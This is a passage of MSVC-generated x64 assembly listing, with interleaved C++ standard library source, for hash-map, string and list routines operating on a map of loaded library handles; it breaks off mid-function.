; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z
_TEXT	SEGMENT
this$dead$ = 64
__$ReturnUdt$ = 72
_Keyval$ = 80
_Hashval$ = 88
??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >, COMDAT

; 1562 :     _NODISCARD _Hash_find_last_result<_Nodeptr> _Find_last(const _Keyty& _Keyval, const size_t _Hashval) const {

$LN62:
	mov	QWORD PTR [rsp+24], rbx
	push	rsi
	push	rdi
	push	r14
	sub	rsp, 32					; 00000020H

; 1563 :         // find the insertion point for _Keyval and whether an element identical to _Keyval is already in the container
; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	mov	r14, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48
	mov	rsi, r8

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;
; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	and	r14, r9
	shl	r14, 4
	mov	rdi, rdx
	add	r14, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	rbx, QWORD PTR [r14+8]
	cmp	rbx, rax
	jne	SHORT $LN5@Find_last

; 1568 :             return {_End, _Nodeptr{}};

	mov	QWORD PTR [rdx], rax

; 1590 :     }

	mov	rax, rdx
	mov	QWORD PTR [rdx+8], 0
	mov	rbx, QWORD PTR [rsp+80]
	add	rsp, 32					; 00000020H
	pop	r14
	pop	rdi
	pop	rsi
	ret	0
$LN5@Find_last:

; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	r14, QWORD PTR [r14]
	mov	QWORD PTR [rsp+64], rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rbp, QWORD PTR [r8+16]
	mov	QWORD PTR [rsp+72], r15

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r15, QWORD PTR [r8+24]
	npad	7
$LL2@Find_last:
	cmp	QWORD PTR [rbx+40], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN22@Find_last

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN22@Find_last:

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	rcx, rsi

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r15, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN29@Find_last

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [rsi]
$LN29@Find_last:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rbp, rax
	jne	SHORT $LN37@Find_last

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rbp
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN45@Find_last
$LN37@Find_last:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, r14
	je	SHORT $LN46@Find_last

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL2@Find_last
$LN45@Find_last:

; 1575 :                 if constexpr (!_Traits::_Standard) {
; 1576 :                     if (_Traitsobj(_Traits::_Kfn(_Where->_Myval), _Keyval)) {
; 1577 :                         return {_Where->_Next, _Nodeptr{}};
; 1578 :                     }
; 1579 :                 }
; 1580 : 
; 1581 :                 return {_Where->_Next, _Where};

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [rdi], rax
	mov	QWORD PTR [rdi+8], rbx
	jmp	SHORT $LN58@Find_last
$LN46@Find_last:

; 1585 :                 return {_Where, _Nodeptr{}};

	mov	QWORD PTR [rdi], rbx
	mov	QWORD PTR [rdi+8], 0
$LN58@Find_last:

; 1590 :     }

	mov	rbp, QWORD PTR [rsp+64]
	mov	rax, rdi
	mov	r15, QWORD PTR [rsp+72]
	mov	rbx, QWORD PTR [rsp+80]
	add	rsp, 32					; 00000020H
	pop	r14
	pop	rdi
	pop	rsi
	ret	0
??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Get_size_of_n@$07@std@@YA_K_K@Z
_TEXT	SEGMENT
_Count$ = 48
??$_Get_size_of_n@$07@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<8>, COMDAT

; 79   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN7:
	sub	rsp, 40					; 00000028H

; 80   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;
; 81   : 
; 82   :     if constexpr (_Overflow_is_possible) {
; 83   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 84   :         if (_Count > _Max_possible) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	cmp	rcx, rax
	ja	SHORT $LN6@Get_size_o

; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rax, QWORD PTR [rcx*8]

; 90   : }

	add	rsp, 40					; 00000028H
	ret	0
$LN6@Get_size_o:

; 85   :             _Throw_bad_array_new_length(); // multiply overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN4@Get_size_o:
??$_Get_size_of_n@$07@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<8>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z
_TEXT	SEGMENT
_Haystack$ = 64
_Hay_size$ = 72
_Start_at$dead$ = 80
_Needle$ = 88
_Needle_size$ = 96
??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z PROC ; std::_Traits_find<std::char_traits<char> >, COMDAT

; 573  :     const size_t _Needle_size) noexcept {

$LN30:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rbp
	mov	QWORD PTR [rsp+24], rsi
	push	rdi
	push	r14
	push	r15
	sub	rsp, 32					; 00000020H

; 574  :     // search [_Haystack, _Haystack + _Hay_size) for [_Needle, _Needle + _Needle_size), at/after _Start_at
; 575  :     if (_Needle_size > _Hay_size || _Start_at > _Hay_size - _Needle_size) {

	mov	rdi, QWORD PTR _Needle_size$[rsp]
	mov	rsi, r9
	mov	rbp, rcx
	cmp	rdi, rdx
	ja	SHORT $LN6@Traits_fin

; 585  :     }
; 586  : 
; 587  :     if (_Needle_size == 0) { // empty string always matches if xpos is possible

	test	rdi, rdi
	jne	SHORT $LN7@Traits_fin

; 588  :         return _Start_at;

	xor	eax, eax
	jmp	SHORT $LN3@Traits_fin
$LN7@Traits_fin:

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	movsx	r15d, BYTE PTR [r9]

; 589  :     }
; 590  : 
; 591  :     const auto _Possible_matches_end = _Haystack + (_Hay_size - _Needle_size) + 1;

	mov	r14, rbp
	sub	r14, rdi
	add	r14, rdx

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	edx, r15d

; 592  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {
; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	lea	r8, QWORD PTR [r14+1]
	sub	r8, rbp

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	call	memchr
	mov	rbx, rax

; 594  :         if (!_Match_try) { // didn't find first character; report failure

	test	rax, rax
	je	SHORT $LN6@Traits_fin
	npad	11
$LL4@Traits_fin:

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rdi
	mov	rdx, rsi
	mov	rcx, rbx
	call	memcmp

; 595  :             return static_cast<size_t>(-1);
; 596  :         }
; 597  : 
; 598  :         if (_Traits::compare(_Match_try, _Needle, _Needle_size) == 0) { // found match

	test	eax, eax
	je	SHORT $LN20@Traits_fin

; 592  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {
; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	inc	rbx
	lea	r8, QWORD PTR [r14+1]
	sub	r8, rbx

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	rcx, rbx
	mov	edx, r15d
	call	memchr
	mov	rbx, rax

; 594  :         if (!_Match_try) { // didn't find first character; report failure

	test	rax, rax
	jne	SHORT $LL4@Traits_fin
$LN6@Traits_fin:

; 576  :         // xpos cannot exist, report failure
; 577  :         // N4950 [string.view.find]/3 says:
; 578  :         // 1. _Start_at <= xpos
; 579  :         // 2. xpos + _Needle_size <= _Hay_size;
; 580  :         // therefore:
; 581  :         // 3. _Needle_size <= _Hay_size (by 2) (checked above)
; 582  :         // 4. _Start_at + _Needle_size <= _Hay_size (substitute 1 into 2)
; 583  :         // 5. _Start_at <= _Hay_size - _Needle_size (4, move _Needle_size to other side) (also checked above)
; 584  :         return static_cast<size_t>(-1);

	mov	rax, -1
$LN3@Traits_fin:

; 600  :         }
; 601  :     }
; 602  : }

	mov	rbx, QWORD PTR [rsp+64]
	mov	rbp, QWORD PTR [rsp+72]
	mov	rsi, QWORD PTR [rsp+80]
	add	rsp, 32					; 00000020H
	pop	r15
	pop	r14
	pop	rdi
	ret	0
$LN20@Traits_fin:

; 599  :             return static_cast<size_t>(_Match_try - _Haystack);

	sub	rbx, rbp
	mov	rax, rbx
	jmp	SHORT $LN3@Traits_fin
??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z ENDP ; std::_Traits_find<std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z PROC ; std::move<std::allocator<char> &>, COMDAT

; 1548 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, rcx

; 1549 : }

	ret	0
??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ENDP ; std::move<std::allocator<char> &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@AEAU10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@AEAU10@@Z PROC ; std::addressof<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@AEAU10@@Z ENDP ; std::addressof<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Destroy_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@@Z
_TEXT	SEGMENT
_First$dead$ = 8
_Last$dead$ = 16
??$_Destroy_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@@Z PROC ; std::_Destroy_range<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>, COMDAT

; 1075 :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 1076 :     if constexpr (!is_trivially_destructible_v<_Iter_value_t<_NoThrowFwdIt>>) {
; 1077 :         for (; _First != _Last; ++_First) {
; 1078 :             _STD _Destroy_in_place(*_First);
; 1079 :         }
; 1080 :     }
; 1081 : }

	ret	0
??$_Destroy_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@@Z ENDP ; std::_Destroy_range<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$0A@@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
_Al$dead$ = 16
??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$0A@@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > ><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &,0>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
	mov	QWORD PTR [rcx+16], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 264  :     }

	mov	rax, rcx
	ret	0
??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$0A@@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > ><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Head$ = 56
??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z PROC ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >, COMDAT

; 323  :         _Alnode& _Al, _Nodeptr _Head) noexcept { // free a list starting at _First and terminated at nullptr

$LN124:
	mov	QWORD PTR [rsp+24], rbx
	push	rsi
	sub	rsp, 32					; 00000020H

; 324  :         _Head->_Prev->_Next = nullptr;

	mov	rax, QWORD PTR [rdx+8]
	xor	esi, esi
	mov	QWORD PTR [rax], rsi

; 325  : 
; 326  :         auto _Pnode = _Head->_Next;

	mov	rbx, QWORD PTR [rdx]

; 327  :         for (_Nodeptr _Pnext; _Pnode; _Pnode = _Pnext) {

	test	rbx, rbx
	je	SHORT $LN113@Free_non_h
	mov	QWORD PTR [rsp+48], rdi
$LL4@Free_non_h:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+40]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 328  :             _Pnext = _Pnode->_Next;

	mov	rdi, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN41@Free_non_h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

